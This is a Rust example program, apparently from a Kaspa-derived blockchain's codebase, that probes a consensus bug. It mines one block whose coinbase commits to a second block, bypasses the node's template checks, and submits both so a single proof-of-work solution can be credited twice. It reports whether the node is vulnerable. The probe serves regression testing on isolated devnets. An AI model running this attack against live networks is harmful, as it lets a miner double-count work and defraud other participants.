//! Regression probe for the AuxPoW self-parent double credit: one kHeavyHash solution counted as
//! the proof of work of two ZKas blocks. Adapted from the probe in gh14rekt's
//! `fix/auxpow-native-parent-double-credit` branch, with a second variant for the security-fork
//! commitment form.
//!
//! Run only against an isolated devnet/testnet node:
//!
//! ```text
//! cargo run --release -p zkas-api --example auxpow_double_credit -- \
//!   127.0.0.1:26610 zkasdev:... legacy|bound [genesis-hex]
//! ```
//!
//! `P` is mined natively and its own coinbase carries a commitment to `Q`; `Q` fails native PoW
//! and uses P's header and coinbase as its AuxPoW parent. The commitment is appended to P's
//! payload directly, so the node's template refusal is bypassed and only consensus decides.
//! - `legacy`: `ZKMM || hex(H_Q)` (the pre-fork form).
//! - `bound`: `ZKM1 || hex(bound_commitment(genesis, nonce-free H_Q))`, Q's nonce = P's hash.
//! A node that credits both bodies is vulnerable.

use std::error::Error;

use kaspa_addresses::Address;
use kaspa_consensus_core::{
    auxpow::AuxPow,
    block::{Block, MutableBlock},
    hashing,
    header::Header,
    merkle::calc_hash_merkle_root,
};
use kaspa_grpc_client::GrpcClient;
use kaspa_consensus_core::Hash;
use kaspa_pow::State;
use kaspa_rpc_core::{api::rpc::RpcApi, notify::mode::NotificationMode};

fn first_nonce(header: &Header, valid: bool) -> u64 {
    let state = State::new(header);
    (0u64..).find(|n| state.check_pow(*n).0 == valid).expect("a nonce exists")
}

fn as_mutable(block: Block) -> MutableBlock {
    MutableBlock::new((*block.header).clone(), (*block.transactions).clone())
}

fn raw(block: &MutableBlock) -> kaspa_rpc_core::RpcRawBlock {
    (&block.clone().to_immutable()).into()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let rpc = std::env::args().nth(1).unwrap_or_else(|| "127.0.0.1:26610".into());
    let address = Address::try_from(std::env::args().nth(2).ok_or("missing mining address")?.as_str())?;
    let mode = std::env::args().nth(3).unwrap_or_else(|| "legacy".into());
    let genesis: Option<Hash> = std::env::args().nth(4).map(|g| g.parse()).transpose().map_err(|_| "bad genesis hex")?;
    let client = GrpcClient::connect_with_args(
        NotificationMode::Direct,
        format!("grpc://{rpc}"),
        None,
        true,
        None,
        false,
        Some(60_000),
        Default::default(),
    )
    .await?;
    let blocks_before = client.get_block_dag_info().await?.block_count;

    let q_template = client.get_block_template(address.clone(), Vec::new()).await?;
    let mut q = as_mutable(q_template.block.try_into()?);
    q.header.nonce = first_nonce(&q.header, false);
    q.header.finalize();
    let p_template = client.get_block_template(address, Vec::new()).await?;
    let mut p = as_mutable(p_template.block.try_into()?);
    if p.transactions.len() != 1 {
        return Err(format!("needs a coinbase-only template (empty mempool), got {} transactions", p.transactions.len()).into());
    }

    let commitment = match mode.as_str() {
        "legacy" => AuxPow::embed_commitment(&[], q.header.hash, &[]),
        "bound" => {
            let genesis = genesis.ok_or("bound mode needs the genesis hash")?;
            let nonce_free = hashing::header::hash_override_nonce_time(&q.header, 0, q.header.timestamp);
            AuxPow::embed_commitment_v1(&[], AuxPow::bound_commitment(genesis, nonce_free), &[])
        }
        other => return Err(format!("unknown mode {other}").into()),
    };
    p.transactions[0].payload.extend_from_slice(&commitment);
    p.header.hash_merkle_root = calc_hash_merkle_root(p.transactions.iter());
    p.header.finalize();
    p.header.nonce = first_nonce(&p.header, true);
    p.header.finalize();

    if mode == "bound" {
        // The fork form: Q's nonce names its parent, so it is set only now that P is solved.
        q.header.nonce = AuxPow::nonce_binding(&p.header);
        q.header.finalize();
        if State::new(&q.header).check_pow(q.header.nonce).0 {
            return Err("Q happens to be natively valid with the bound nonce; rerun".into());
        }
    }
    let aux = AuxPow { parent_header: p.header.clone(), parent_coinbase: p.transactions[0].clone(), coinbase_merkle_branch: vec![] };
    if !State::new(&aux.parent_header).check_pow(aux.parent_header.nonce).0 {
        return Err("P's solution does not clear Q's target".into());
    }
    q.header.aux_pow = Some(Box::new(aux));

    let p_response = client.submit_block(raw(&p), true).await?;
    let q_response = client.submit_block(raw(&q), true).await?;
    tokio::time::sleep(std::time::Duration::from_millis(1500)).await;
    let p_known = client.get_block(p.header.hash, false).await.is_ok();
    let q_known = client.get_block(q.header.hash, false).await.is_ok();
    let blocks_after = client.get_block_dag_info().await?.block_count;
    println!("mode={mode}");
    println!("P={} report={:?} detail={} stored={p_known}", p.header.hash, p_response.report, p_response.reject_detail);
    println!("Q={} report={:?} detail={} stored={q_known}", q.header.hash, q_response.report, q_response.reject_detail);
    println!("block_count {blocks_before} -> {blocks_after} (other miners may add blocks meanwhile)");
    match (p_known, q_known) {
        (true, true) => println!("RESULT=VULNERABLE one solution credited two blocks"),
        (false, false) => println!("RESULT=FIXED neither block accepted"),
        _ => println!("RESULT=FIXED at most one block accepted for one solution"),
    }
    Ok(())
}
